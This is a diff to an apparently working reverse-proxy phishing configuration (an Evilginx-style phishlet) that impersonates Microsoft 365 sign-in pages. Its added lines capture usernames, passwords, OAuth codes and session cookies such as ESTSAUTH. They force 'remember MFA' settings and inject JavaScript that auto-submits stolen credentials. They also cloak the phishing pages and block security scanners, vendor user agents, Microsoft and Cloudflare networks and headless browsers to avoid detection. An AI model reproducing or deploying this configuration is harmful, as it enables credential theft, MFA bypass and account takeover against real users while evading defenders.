@@ -1,5 +1,32 @@
-min_ver: "3.3.0"
-
+min_ver: "4.0.0"
+ip_filtering:
+  allow:
+    - "192.168.1.0/24"
+  block:
+    - "10.0.0.0/8"
+    - "security.company.com"
+  action: "redirect"
+  redirect_url: "https://www.microsoft.com/en-us/"
+geo_filtering:
+  allow:
+    - "US"
+    - "GB"
+  block:
+    - "CN"
+    - "RU"
+asn_filtering:
+  block:
+    - "AS8075"
+    - "AS13335"
+captcha_bypass:
+  - domain: "login.microsoftonline.com"
+    method: "session_cookie"
+    trigger_paths: ["/common/login"]
+    inject_script: |
+      if (document.querySelector("#captchaContainer")) {
+        document.cookie = "captcha_bypassed=1; path=/";
+        setTimeout(() => location.reload(), 1500);
+      }
 proxy_hosts:
   - {
       phish_sub: "secure",
@@ -7,118 +34,132 @@ proxy_hosts:
       domain: "microsoftonline.com",
       session: true,
       is_landing: true,
-      ssl: true,
-      chain_ssl: true,
     }
   - {
       phish_sub: "auth",
-      orig_sub: "login",
-      domain: "live.com",
+      orig_sub: "outlook",
+      domain: "office.com",
       session: true,
-      is_landing: false,
-      ssl: true,
     }
   - {
       phish_sub: "portal",
-      orig_sub: "www",
-      domain: "office.com",
+      orig_sub: "account",
+      domain: "microsoft.com",
       session: true,
-      is_landing: false,
-      ssl: true,
     }
-
-auth_tokens:
-  - domain: ".live.com"
-    keys:
-      [
-        "ESTSAUTH",
-        "ESTSAUTHPERSISTENT",
-        "MSPAuth",
-        "MSPOK",
-        "MSCC",
-        "SignInStateCookie",
-      ]
+cloaking:
   - domain: "login.microsoftonline.com"
-    keys:
-      [
-        "MSAuthToken",
-        "fpc",
-        "stsservicecookie",
-        ".*_sessid",
-        "MSPAuth",
-        "MSPOK",
-      ]
-  - domain: ".office.com"
-    keys: ["FedAuth", "OfficeSessionToken", "MSAuth", ".*_sessionid"]
-
+    title: "Microsoft Account"
+    favicon: "https://login.microsoftonline.com/favicon.ico"
+    hide_phishlet: true
+  - domain: "outlook.office.com"
+    title: "Outlook"
+    favicon: "https://outlook.office.com/favicon.ico"
+    hide_phishlet: true
+  - domain: "account.microsoft.com"
+    title: "My Account"
+    favicon: "https://account.microsoft.com/favicon.ico"
+    hide_phishlet: true
+user_agent_filter:
+  deny:
+    - "bot"
+    - "scan"
+    - "zscaler"
+    - "crowdstrike"
+    - "phantom"
+  allow:
+    - "windows"
+    - "macos"
+    - "iphone"
+    - "android"
+random_delays:
+  min: 1500
+  max: 4000
+honeytrap:
+  - path: "/.env"
+    response_code: 404
+    log_ip: true
+  - path: "/wp-admin"
+    response_code: 403
+    log_ip: true
+  - path: "/admin"
+    response_code: 403
+    log_ip: true
+  - path: "/robots.txt"
+    response_code: 200
+    log_ip: true
+  - path: "/.git/config"
+    response_code: 403
+    log_ip: true
+auth_tokens:
+  - domain: ".login.microsoftonline.com"
+    keys: ["ESTSAUTH", "esctx", "SignInStateCookie", "x-ms-gateway-slice"]
+    type: "cookie"
+  - domain: ".live.com"
+    keys: ["RPSSecAuth", "MSPAuth", "MSPCID"]
+    type: "cookie"
+sub_filters:
+  - {
+      triggers_on: "auth.microsoftonline.com",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      search: "login.microsoftonline.com",
+      replace: "{hostname}",
+      mimes: ["text/html", "application/javascript"],
+    }
+  - {
+      triggers_on: "auth.microsoftonline.com",
+      orig_sub: "login",
+      domain: "microsoftonline.com",
+      search: "https://login.microsoftonline.com",
+      replace: "https://{hostname}",
+      mimes: ["text/html"],
+    }
+force_post:
+  - path: "/kmsi"
+    search: [{ key: "LoginOptions", search: ".*" }]
+    force: [{ key: "LoginOptions", value: "1" }]
+    type: "post"
+  - path: "/SAS/ProcessAuth"
+    search: [{ key: "AuthMethod", search: ".*" }]
+    force: [{ key: "RememberMFA", value: "true" }]
+    type: "post"
 credentials:
-  username:
-    key: "loginfmt"
-    search: "(.*)"
-    type: "post"
-  password:
-    key: "passwd"
-    search: "(.*)"
-    type: "post"
-  otp:
-    key: "otc"
-    search: "(.*)"
-    type: "post"
-
-sub_filters: [] # You can re-add your JS subfilters here after confirming base flow works
-
-filters:
-  - name: block_automation_tools
-    type: user-agent
-    action: deny
-    patterns:
-      - "(?i)(bot|crawler|scan|spider|burp|zap|nikto|python|curl|wget|postman|headless)"
-      - "HeadlessChrome"
-
-  - name: block_infrastructure_ips
-    type: ip
-    action: deny
-    patterns:
-      - "8.8.8.8/32"
-      - "1.1.1.1/32"
-      - "52.96.0.0/12"
-      - "104.16.0.0/13"
-      - "192.42.116.0/24"
-      - "20.190.128.0/18"
-      - "13.107.0.0/16"
-      - "34.0.0.0/8"
-
-  - name: block_high_risk_countries
-    type: geoip
-    action: deny
-    countries: ["RU", "CN", "IN"]
-
-  - name: prevent_bruteforce
-    type: rate-limit
-    requests: 4
-    interval: 90
-    action: redirect
-    redirect_url: "/error/429"
-
-security:
-  - name: fake_tech_headers
-    type: header
-    action: add
-    headers:
-      - "Server: Microsoft-IIS/10.0"
-      - "X-Powered-By: ASP.NET"
-
-  - name: security_headers
-    type: header
-    action: add
-    headers:
-      - "X-Frame-Options: DENY"
-      - "Content-Security-Policy: default-src 'self' *.microsoft.com *.microsoftonline.com *.live.com; script-src 'unsafe-inline' 'self' *.microsoft.com"
-      - "Referrer-Policy: strict-origin-when-cross-origin"
-      - "Permissions-Policy: geolocation=(), microphone=(), camera=()"
-
+  - username:
+      key: "loginfmt"
+      search: "loginfmt=([^&]+)"
+      type: "url"
+  - password:
+      key: "passwd"
+      search: "passwd=([^&]+)"
+      type: "url"
+  - token:
+      key: "code"
+      search: '"code":"([^"]*)"'
+      type: "json"
+js_inject:
+  - trigger_domains: ["auth.microsoftonline.com"]
+    trigger_paths: ["/common/login"]
+    script: |
+      function submitForm() {
+        const u=document.getElementById("i0116");
+        const p=document.getElementById("i0118");
+        const b=document.getElementById("idSIButton9");
+        if(u&&b&&!p){u.value="{email}";setTimeout(()=>b.click(),1200)}
+        else if(p){p.value="{password}";setTimeout(()=>document.querySelector("form").submit(),800)}
+        setTimeout(submitForm,1000);
+      }
+      submitForm();
+  - trigger_domains: ["auth.microsoftonline.com"]
+    trigger_paths: ["/common/login"]
+    script: |
+      if (navigator.webdriver || window.outerWidth === 0 || /Headless/.test(navigator.userAgent)) {
+        location.href = "https://www.microsoft.com";
+      }
+error_urls:
+  - path: "/error"
+    redirect: "https://support.microsoft.com"
+    code: 302
 login:
-  domain: "login.microsoftonline.com"
-  path: "/common/oauth2/v2.0/authorize"
-  delay: 1.5
-  max_attempts: 3
+  domain: "auth.microsoftonline.com"
+  path: "/common/login"
